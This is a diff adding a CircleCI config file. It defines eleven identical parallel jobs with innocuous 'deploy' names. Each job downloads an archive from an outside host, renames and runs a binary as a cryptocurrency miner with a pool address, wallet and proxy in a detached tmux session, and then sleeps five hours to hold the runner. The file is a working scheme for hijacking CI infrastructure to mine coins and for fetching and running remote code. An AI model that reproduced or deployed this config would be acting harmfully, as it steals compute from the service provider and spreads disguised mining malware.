@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  deployproctr:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  deployproctr10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - deployproctr
+      - deployproctr1
+      - deployproctr2
+      - deployproctr3
+      - deployproctr4
+      - deployproctr5
+      - deployproctr6
+      - deployproctr7
+      - deployproctr8
+      - deployproctr9
+      - deployproctr10
